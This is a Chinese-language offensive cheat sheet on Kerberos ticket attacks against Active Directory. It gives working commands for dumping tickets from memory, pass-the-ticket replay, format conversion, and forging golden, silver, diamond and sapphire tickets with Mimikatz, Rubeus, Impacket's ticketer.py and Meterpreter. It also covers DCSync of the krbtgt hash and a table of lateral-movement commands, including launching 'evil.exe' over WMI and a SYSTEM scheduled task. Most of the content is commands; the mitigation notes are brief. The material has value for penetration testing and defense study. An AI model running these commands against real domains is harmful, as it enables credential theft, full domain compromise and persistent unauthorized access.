# Kerberos - 票据 (Tickets)

票据 (Tickets) 用于授予对网络资源的访问权限。票据是一种数据结构，其中包含有关用户身份、正在访问的网络服务或资源以及与该资源相关的权限或特权等信息。Kerberos 票据的生命周期有限，并且在设定的时间后会过期，通常为 8 到 12 小时。

Kerberos 中有两种类型的票据：

* **票据授予票据 (Ticket Granting Ticket, TGT)**：TGT 是用户在初始身份验证过程中获取的。它用于请求其他服务票据，而无需用户重新输入凭据。TGT 包含用户身份、时间戳以及用户密钥的加密数据。

* **服务票据 (Service Ticket, ST)**：服务票据用于访问特定的网络服务或资源。用户向服务或资源出示服务票据，服务或资源随后使用该票据对用户进行身份验证并授予对请求资源的访问权限。服务票据包含用户身份、时间戳以及服务密钥的加密数据。

## 导出 Kerberos 票据 (Dump Kerberos Tickets)

* Mimikatz: `sekurlsa::tickets /export`
* Rubeus

  ```ps1
  # 列出可用票据
  Rubeus.exe triage

  # 导出一个票据，输出格式为 Kirbi
  Rubeus.exe dump /luid:0x12d1f7
  ```

## 重放 Kerberos 票据 (Replay Kerberos Tickets)

* Mimikatz: `mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"`
* netexec: `KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache`

## 转换 Kerberos 票据 (Convert Kerberos Tickets)

在 Kerberos 身份验证协议中，ccache 和 kirbi 是两种类型的 Kerberos 凭据缓存，用于存储 Kerberos 票据。

* 凭据缓存或 `"ccache"` 是一个临时存储区域，用于存储在身份验证过程中获取的 Kerberos 票据。ccache 包含用户的身份验证凭据，并用于访问网络资源，而无需在每次请求时都重新输入用户凭据。

* Microsoft Windows 系统使用的 Kerberos 集成 Windows 身份验证 (Kerberos Integrated Windows Authentication, KIWA) 协议也利用了一种称为 `"kirbi"` 缓存的凭据缓存。kirbi 缓存类似于标准 Kerberos 实现所使用的 ccache，但在其结构和管理方式上存在一些差异。

虽然这两种缓存都具有存储 Kerberos 票据以实现对网络资源的高效访问这一相同基本目的，但它们的格式和结构有所不同。你可以使用以下方法轻松转换它们：

* kekeo: `misc::convert ccache ticket.kirbi`
* impacket: `impacket-ticketConverter SRV01.kirbi SRV01.ccache`

## Pass-the-Ticket 黄金票据 (Golden Tickets)

黄金票据 (Golden Ticket) 是一种伪造的 Kerberos 票据授予票据 (TGT)，允许攻击者在受感染的 Active Directory 域中模拟任何用户（包括域管理员）。

**要求 (Requirements)**:

| 要求 (Requirement)               | 描述 (Description)                          |
|---------------------------------|---------------------------------------------|
| 域名 (Domain name)              | corp.local                                  |
| 域 SID (Domain SID)             | S-1-5-21-1234567890-2345678901-3456789012 |
| KRBTGT NTLM 哈希 (NTLM hash)      | KRBTGT 帐户的 NTLM 哈希                       |
| 用户名 (Username)               | Administrator                               |
| (可选) 组 ((Optional) Groups)    | 添加用于提升权限的组 SID (例如域管理员 Domain Admin) |

由于 `CVE-2021-42287` 的缓解措施，票据不能使用一个不存在的帐户名。

> 伪造黄金票据的方法与伪造白银票据的方法非常相似。主要区别在于，在这种情况下，不能向 ticketer.py 指定服务 SPN，并且必须使用 krbtgt 的 NT 哈希。

### 黄金票据创建 (Golden Ticket Creation)

* 使用 **Ticketer**

```powershell
python3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-1234567890-2345678901-3456789012 \
  -domain corp.local Administrator

python3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-1234567890-2345678901-3456789012 \
  -domain corp.local \
  -user-id 500 \
  -extra-sid S-1-5-21-1234567890-2345678901-3456789012-512 \
  Administrator
```

* 使用 **Mimikatz**

```powershell
# 获取信息 - Mimikatz
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt

# 伪造黄金票据 - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

* 使用 **Meterpreter**

```powershell
# 获取信息 - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

# 伪造黄金票据 - Meterpreter
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```

具有 "Enterprise admins" (企业管理员) SID 的黄金票据可以跨越林 (forest) 边界使用。

**缓解措施 (Mitigations)**:

* 很难检测，因为它们是合法的 TGT 票据
* Mimikatz 生成的黄金票据寿命长达 10 年

## Pass-the-Ticket 白银票据 (Silver Tickets)

伪造服务票据 (ST) 需要机器帐户的密码（密钥）或服务帐户的 NT 哈希。

```powershell
# 为服务创建票据
mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE

# 示例
mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park

# 然后使用与黄金票据相同的步骤
mimikatz $ misc::convert ccache ticket.kirbi

root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
```

使用白银票据攻击令人感兴趣的目标服务：

| 服务类型 (Service Type)                     | 服务的白银票据 (Service Silver Tickets) | 攻击示例 (Attack) |
|---------------------------------------------|------------------------|--------|
| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
| PowerShell Remoting                         | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| 计划任务 (Scheduled Tasks)                  | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
| Windows 文件共享 (Windows File Share, CIFS) | CIFS                   | `dir \\dc01\c$` |
| LDAP 操作 (包括 Mimikatz DCSync)             | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
| Windows 远程服务器管理工具 (RSAT)             | RPCSS   + LDAP  + CIFS | /      |

缓解措施 (Mitigations):

* 设置属性 “Account is Sensitive and Cannot be Delegated” (帐户敏感，无法被委派)以防止使用生成的票据进行横向移动。

## Pass-the-Ticket 钻石票据 (Diamond Tickets)

> 请求具有较低权限的合法 TGT，并在提供 krbtgt 加密密钥的情况下，仅重新计算 PAC 字段

要求 (Requirements):

* krbtgt NT 哈希
* krbtgt AES 密钥

```ps1
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```

## Pass-the-Ticket 蓝宝石票据 (Sapphire Tickets)

> 在 TGS-REQ(P) (PKINIT) 期间通过 `S4U2self+U2U` 交换请求目标用户的 PAC。

目标是使 PAC 字段尽可能模仿合法字段。

要求 (Requirements):

* [Impacket PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)
* krbtgt AES 密钥

```ps1
# 将会忽略 baduser 参数
ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
```

## 参考资料 (References)

* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
* [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
